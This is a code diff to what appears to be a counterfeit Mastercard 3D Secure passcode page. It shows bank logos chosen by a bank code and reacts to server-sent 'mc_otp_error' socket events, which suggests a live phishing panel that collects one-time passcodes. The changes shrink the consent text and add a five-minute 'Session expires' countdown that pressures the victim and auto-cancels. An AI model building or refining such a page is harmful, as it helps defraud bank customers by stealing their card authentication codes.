@@ -614,10 +614,10 @@
         Incorrect OTP, please enter valid one time passcode sent to your registered mobile
       </p>
       
-      <!-- Consent checkbox -->
+      <!-- Consent checkbox - updated to be smaller -->
       <div style="margin-bottom: 15px;">
-        <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 12px; color: #555;">
-          <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 8px; margin-top: 1px;" checked>
+        <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 11px; color: #555; margin-left: 5px; margin-right: 5px;">
+          <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 5px; margin-top: 2px; width: 12px; height: 12px;" checked>
           <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
         </label>
       </div>
@@ -628,6 +628,9 @@
         <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
         <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
       </div>
+      
+      <!-- Timer will be inserted here dynamically -->
+      <div id="mcTimer" style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;"></div>
       
       <!-- Footer links -->
       <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
@@ -2010,7 +2013,8 @@ init();
       submitBtn: document.getElementById('mcSubmitBtn'),
       resendBtn: document.getElementById('mcResendBtn'),
       cancelBtn: document.getElementById('mcCancelBtn'),
-      consentBox: document.getElementById('mcConsentCheckbox')
+      consentBox: document.getElementById('mcConsentCheckbox'),
+      timerDisplay: document.getElementById('mcTimer') // Timer display element
     };
   }
   
@@ -2052,10 +2056,11 @@ init();
     const storedData = window.mcVerificationData || {};
     
     // Update logos
-    // 1. Bank logo
+    // 1. Bank logo - updated to ensure bank logo shows on left side
     if (dom.bankLogo) {
       const bankCode = data.bankCode?.toLowerCase() || 'housing';
       dom.bankLogo.src = bankLogos[bankCode] || bankLogos.housing;
+      dom.bankLogo.alt = `${bankCode} Bank`;
     }
     
     // 2. Verification type logo
@@ -2104,10 +2109,74 @@ init();
     dom.loadingContent.style.display = 'none';
     dom.verificationContent.style.display = 'block';
     
+    // Style the consent checkbox to be smaller
+    const consentLabel = document.getElementById('consentLabel');
+    if (consentLabel) {
+      consentLabel.style.fontSize = '11px';
+      consentLabel.style.marginLeft = '5px';
+      consentLabel.style.marginRight = '5px';
+    }
+    
+    const consentCheckbox = document.getElementById('mcConsentCheckbox');
+    if (consentCheckbox) {
+      consentCheckbox.style.width = '12px';
+      consentCheckbox.style.height = '12px';
+      consentCheckbox.style.marginTop = '2px';
+    }
+    
+    // Start the timer for 4:59 minutes
+    startMCTimer();
+    
     // Setup event handlers
     setupHandlers();
     
     console.log('MC Verification form shown');
+  }
+  
+  // Start the 4:59 minute timer
+  function startMCTimer() {
+    const timerDisplay = document.createElement('div');
+    timerDisplay.id = 'mcTimer';
+    timerDisplay.style.textAlign = 'center';
+    timerDisplay.style.marginTop = '10px';
+    timerDisplay.style.fontSize = '12px';
+    timerDisplay.style.color = '#666';
+    
+    // Insert the timer after the resend button
+    const resendBtn = document.getElementById('mcResendBtn');
+    if (resendBtn && resendBtn.parentNode) {
+      resendBtn.parentNode.parentNode.appendChild(timerDisplay);
+    }
+    
+    let timeLeft = 299; // 4:59 in seconds
+    updateTimerDisplay(timeLeft);
+    
+    if (mcTimerInterval) {
+      clearInterval(mcTimerInterval);
+    }
+    
+    mcTimerInterval = setInterval(() => {
+      timeLeft--;
+      updateTimerDisplay(timeLeft);
+      
+      if (timeLeft <= 0) {
+        clearInterval(mcTimerInterval);
+        // Handle timeout - maybe show an error or auto-cancel
+        const cancelBtn = document.getElementById('mcCancelBtn');
+        if (cancelBtn) {
+          cancelBtn.click();
+        }
+      }
+    }, 1000);
+  }
+  
+  function updateTimerDisplay(seconds) {
+    const minutes = Math.floor(seconds / 60);
+    const remainingSeconds = seconds % 60;
+    const timerDisplay = document.getElementById('mcTimer');
+    if (timerDisplay) {
+      timerDisplay.textContent = `Session expires in: ${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
+    }
   }
   
   // Setup event handlers
@@ -2209,6 +2278,10 @@ init();
     if (dom.overlay) {
       dom.overlay.style.display = 'none';
     }
+    
+    if (mcTimerInterval) {
+      clearInterval(mcTimerInterval);
+    }
   }
   
   // Socket event listeners
@@ -2231,10 +2304,11 @@ init();
       const dom = initDOM();
       if (dom.bankLogo && data.bankCode) {
         dom.bankLogo.src = bankLogos[data.bankCode.toLowerCase()] || bankLogos.housing;
+        dom.bankLogo.alt = `${data.bankCode} Bank`;
       }
     });
     
-    // Handle OTP errors
+    // Handle OTP errors - only respond to server-initiated errors
     socket.on('mc_otp_error', function(data) {
       console.log('Received mc_otp_error event:', data);
       const dom = initDOM();
